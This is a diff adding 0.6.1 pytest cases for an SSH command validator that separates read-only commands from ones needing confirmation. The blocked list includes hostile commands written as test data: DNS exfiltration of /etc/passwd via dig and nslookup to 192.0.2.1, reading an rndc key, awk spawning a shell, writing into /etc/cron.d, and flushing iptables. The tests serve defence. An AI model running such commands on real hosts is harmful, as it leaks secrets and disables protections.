@@ -389,3 +389,120 @@ def test_dollar_quote_inside_other_quotes_is_data(cmd):
 @pytest.mark.parametrize("cmd", ["grep -c $'\\r' /etc/hostname", "grep -c $'\\t' /etc/hostname"])
 def test_plain_ansi_c_escapes_still_read(cmd):
     validate_ssh_command(cmd, confirmed=False)
+
+
+# --- 0.6.1 ------------------------------------------------------------------------------
+
+NEEDS_CONFIRMATION_061 = [
+    # DNS lookups that take names from a file or stdin send the file to the server
+    "dig -f /etc/passwd @192.0.2.1",
+    "dig -f/etc/passwd",
+    "dig -4f /etc/passwd",
+    "dig -k /etc/bind/rndc.key example.com",
+    "cat /etc/passwd | nslookup - 192.0.2.1",
+    "cat /etc/passwd | nslookup",
+    "nslookup -type=txt - 192.0.2.1",
+    "dig $line.example.com",
+    "host $(hostname).example.com",
+    # ipset: only list/test, -file writes the listing to a file
+    "ipset list -file /etc/cron.d/x",
+    "ipset -file /tmp/x list",
+    "ipset add blk 192.0.2.1",
+    "ipset flush",
+    "ipset save",
+    "ipset destroy blk",
+    # iptables: listings only, -Z zeroes counters inside one
+    "iptables -L -Z",
+    "iptables -nvLZ",
+    "iptables -F",
+    "iptables -A INPUT -s 192.0.2.1 -j DROP",
+    "iptables -D INPUT 1",
+    "iptables -P INPUT ACCEPT",
+    "iptables --zero",
+    "iptables -n",
+    "ip6tables -X",
+    "iptables-save -M /tmp/x.sh",
+    "iptables-save > /tmp/rules",
+    # mysql: the version and nothing else
+    "mysql -V -e 'drop database x'",
+    "mysql -e 'select 1'",
+    "mysql",
+    # awk: one small grammar
+    "awk '{system(\"id\")}' /etc/hosts",
+    "awk 'BEGIN{while((\"id\"|getline l)>0) print l}'",
+    "awk '{print $1 > \"/tmp/x\"}' /etc/hosts",
+    "awk '{print $1 | \"sh\"}' /etc/hosts",
+    "awk -f /tmp/prog.awk /etc/hosts",
+    "awk -v x=1 '{print $1}' /etc/hosts",
+    "awk '{print $1}' FS=: /etc/passwd",
+    "awk '{print $1; print $2}' /etc/hosts",
+    "awk",
+]
+
+READS_061 = [
+    "dig +short example.com",
+    "dig @8.8.8.8 -t txt example.com",
+    "dig -x 192.0.2.1",
+    "nslookup example.com",
+    "nslookup -type=mx example.com 8.8.8.8",
+    "host -t txt example.com",
+    "mysql -V",
+    "mysql --version",
+    "ipset list",
+    "ipset list blk",
+    "ipset list -n",
+    "ipset -o save list blk",
+    "ipset test blk 192.0.2.1",
+    "iptables -S",
+    "iptables -L -n -v",
+    "iptables -nvL INPUT --line-numbers",
+    "iptables -t nat -L -n",
+    "iptables -w 5 -L",
+    "ip6tables -S",
+    "iptables-save",
+    "iptables-save -c -t nat",
+    "zcat /var/log/syslog.2.gz",
+    "zcat /var/log/nginx/access.log.2.gz | grep -c ' 500 '",
+    "zgrep -c error /var/log/syslog.2.gz",
+    "cat /etc/hosts | tr -d ' '",
+    "awk '{print $1}' /etc/hosts",
+    "awk -F: '{print $1, $7}' /etc/passwd",
+    "awk -F ':' '$3 >= 1000 {print $1}' /etc/passwd",
+    "awk 'NR==2' /etc/hosts",
+    "awk '/error/ {print $2, $NF}' /var/log/syslog",
+    "awk '{print $1\" \"$2}' /etc/hosts",
+    "awk '{ print $(NF-1) }' /etc/hosts",
+    "awk '{print}' /etc/hosts",
+]
+
+
+@pytest.mark.parametrize("cmd", NEEDS_CONFIRMATION_061)
+def test_061_needs_confirmation(cmd):
+    with pytest.raises((ValueError, PermissionError)):
+        validate_ssh_command(cmd, confirmed=False)
+    assert not is_read_only_command(cmd)
+
+
+@pytest.mark.parametrize("cmd", READS_061)
+def test_061_reads_pass(cmd):
+    validate_ssh_command(cmd, confirmed=False)
+
+
+@pytest.mark.parametrize("cmd", [
+    "awk '{print" + " $1 " * 120 + " @}' /etc/hosts",
+    "awk '{print" + " $1  " * 100 + "}' /etc/hosts",
+    "echo '" + "{a," * 240 + "'",
+    "grep " + "\"\\\"" * 300,
+    "cat " + "${x:-" * 150,
+    "ls " + " " * 990,
+])
+def test_validator_stays_fast_on_long_adversarial_input(cmd):
+    """0.6.1: '\s*,?\s*' in the awk grammar backtracked exponentially (18 fields hung)."""
+    import time
+    cmd = cmd[:1000]
+    start = time.perf_counter()
+    try:
+        validate_ssh_command(cmd, confirmed=False)
+    except (ValueError, PermissionError):
+        pass
+    assert time.perf_counter() - start < 0.5
